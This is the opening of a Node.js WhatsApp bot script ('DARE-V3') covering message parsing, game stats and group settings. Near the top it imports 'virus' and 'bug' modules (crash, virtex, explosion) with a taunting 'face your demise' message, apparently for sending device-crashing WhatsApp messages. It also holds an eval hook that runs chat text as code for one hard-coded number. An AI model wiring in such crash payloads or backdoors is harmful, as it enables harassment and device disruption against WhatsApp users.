require('./settings')
require('./lib/listmenu')
const {
	downloadContentFromMessage
} = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const ytdl = require('@distube/ytdl-core');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = require('child_process');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const salam = moment(Date.now()).tz('Africa/Lagos').locale('id').format('a')
//bug beta by badboi
const Badboi = fs.readFileSync(`./data/bmb.jpg`)
const scar1 = fs.readFileSync(`./data/scar1.jpg`)
const xcrash = fs.readFileSync(`./data/xcrash.png`)
const image1 = fs.readFileSync(`./data/image1.jpg`)
const scarlet = fs.readFileSync('./data/scarlet.jpg')
//bug beta by B.M.B
const { ngazap } = require('./virus/ngazap')
const { crash } = require('./virus/crash')
const { buttonkal } = require('./virus/buttonkal')
const { cttl } = require('./virus/cttl')
const { tizi } = require('./virus/tizi')
const { weg } = require('./virus/weg')
const { virus7 } = require('./virus/virus7')
const { notif3 } = require("./virus/notif3")
const { notif4 } = require("./virus/notif4")
// Function getcase get Function 
const userSessions = {};

const { teksCrashUi } = require("./virus/virtex.js")
const Lilybum = fs.readFileSync('./data/image1.jpg')
const { teksInVisiXz } = require("./virus/delay.js")
const { buttonvirus } = require("./virus/buttonvirus.js")
const { explosion } = require("./virus/bugcrash.js")
const { Veoni } = require("./virus/xnaf.js")
const { old1, old2, old3 } = require("./virus/bugold.js")
const { Cluex } = require("./virus/ClueX.js")
//virtex end 
const { Client } = require('ssh2');
const { teksbug1 } = require("./bmb/virtex.js")
const { teksbug2 } = require("./bmb/delay.js")
const { beta1, beta2, buk1 } = require("./lib/hdr.js")
const resbug = (`ʙᴏᴛ ᴍᴏʀᴇ ᴘʀᴏᴄᴇss ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ...👑️*`)
const donebug = (`𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 *DARE-V3* 𝙉𝙊𝙒 𝙁𝘼𝘾𝙀 𝙔𝙊𝙐𝙍 𝘿𝙀𝙈𝙄𝙎𝙀!`)
//bug sound import by bmb 
const bug = 'https://files.catbox.moe/ur5rvv.opus'; // Replace with your audio URL
const { uploadMedia, handleMediaUpload } = require('./lib/catbox'); 
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const { youtubedl, youtubedlv2 } = require('@bochilteam/scraper-sosmed');
const {translate} = require('@vitalets/google-translate-api');
const { chatGpt, ytMp4, ytMp3 } = require('./lib/scraper');
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh } = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/function")
const { uptotelegra } = require('./scrape/upload')
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const {
    toAudio
} = require('./lib/converter');
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const NanoVoiceNote = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvn.json'))
const NanoSticker = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonsticker.json'))
const ImageNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonimage.json'))
const VideoNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvideo.json'))
const BadNano = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatnano = JSON.parse(fs.readFileSync('./database/chatnano.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = Dare = async (Dare, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '.'
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '


const budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
 const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : ''

async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: Dare.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Dare.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Dare.ev.emit('messages.upsert', msg)
}
         
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : '.'
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Dare.decodeJid(Dare.user.id)
        const DareTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Dare.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = dansyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const isnanochat = m.isGroup ? chatnano.includes(m.chat) : true
      const shouldExit = true
      const automati = true
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
const nanototalpitur = () =>{
            var mytext = fs.readFileSync("./Dare.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Africa/Lagos').format('HH : mm : ss')
        const wit = moment.tz('Africa/Lagos').format('HH : mm : ss')
        const wita = moment.tz('Africa/Lagos').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌌`
 }
 if(time2 < "19:00:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌃`
 }
 if(time2 < "18:00:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌃`
 }
 if(time2 < "15:00:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌅`
 }
 if(time2 < "11:00:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌄`
 }
 if(time2 < "05:00:00"){
var nanoliatwaktu = `ᎶᎾᎾᎠ ᎠᎯᎽ 🌄`
 } 

let dt = moment(Date.now()).tz('Africa/Lagos').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanTime = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+2348089405509") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await Dare.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				Dare.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
Apple: 20,
Banana: 0,
Wine: 0,
Mango: 0,
Orange: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}



const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    	    if (!('antidelete' in setting)) setting.antidelete = false
    	    if (!('autorecordtype' in setting)) setting.autorecordtype = false
            if (!('autorecord' in setting)) setting.autorecord = false
            if (!('autotype' in setting)) setting.autotype = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    		if (!('autoread' in setting)) setting.autoread = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		auto_ai_grup: true,
    		goodbye: true,
        onlygrub: false,
        autorecordtype: false,
        autorecord: false,
          autotype: false,         
          autoread: false,
          antidelete: false,
        onlypc: false,
        welcome: true, 
    		
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !DareTheCreator) return
}


if (!Dare.public) {
if (!m.key.fromMe) return
}

//=========================================\\
//=========================================\\
//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

Dare.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Math Quiz 🎮\there is no Correct Answer 🎉\and want to play again? Send ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
